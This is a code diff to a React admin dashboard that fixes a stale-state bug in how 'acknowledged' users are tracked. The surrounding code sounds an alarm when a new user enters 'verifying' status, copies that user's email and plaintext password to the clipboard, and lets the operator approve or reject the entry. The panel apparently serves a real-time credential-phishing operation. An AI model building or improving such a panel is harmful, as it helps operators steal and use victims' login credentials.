@@ -28,6 +28,11 @@ export default function AdminDashboardPage() {
   const isAlarmPlayingRef = useRef<boolean>(false);
   const lastNotificationTimeRef = useRef<{ [key: number]: number }>({});
   const soundMutedRef = useRef<boolean>(soundMuted);
+  const acknowledgedUsersRef = useRef<number[]>(acknowledgedUsers);
+
+  useEffect(() => {
+    acknowledgedUsersRef.current = acknowledgedUsers;
+  }, [acknowledgedUsers]);
 
   useEffect(() => {
     soundMutedRef.current = soundMuted;
@@ -130,7 +135,7 @@ export default function AdminDashboardPage() {
 
         if (u.status === 'verifying') {
           newCount++;
-          if (sec < 60 && !acknowledgedUsers.includes(uid)) {
+          if (sec < 60 && !acknowledgedUsersRef.current.includes(uid)) {
             shouldRing = true;
             if (
               !lastNotificationTimeRef.current[uid] ||
@@ -188,7 +193,8 @@ export default function AdminDashboardPage() {
   // User Actions
   const copyData = (email: string, pass: string, id: number) => {
     navigator.clipboard.writeText(email + ' ' + pass);
-    if (!acknowledgedUsers.includes(id)) {
+    if (!acknowledgedUsersRef.current.includes(id)) {
+      acknowledgedUsersRef.current = [...acknowledgedUsersRef.current, id];
       setAcknowledgedUsers((prev) => [...prev, id]);
     }
     manageAlarm(false);
@@ -197,6 +203,10 @@ export default function AdminDashboardPage() {
 
   const approveUser = async (id: number) => {
     try {
+      if (!acknowledgedUsersRef.current.includes(id)) {
+        acknowledgedUsersRef.current = [...acknowledgedUsersRef.current, id];
+        setAcknowledgedUsers((prev) => [...prev, id]);
+      }
       const formData = new FormData();
       formData.append('user_id', String(id));
       formData.append('status', 'approved');
@@ -216,6 +226,10 @@ export default function AdminDashboardPage() {
 
   const rejectUser = async (id: number) => {
     try {
+      if (!acknowledgedUsersRef.current.includes(id)) {
+        acknowledgedUsersRef.current = [...acknowledgedUsersRef.current, id];
+        setAcknowledgedUsers((prev) => [...prev, id]);
+      }
       const formData = new FormData();
       formData.append('user_id', String(id));
       formData.append('status', 'rejected');
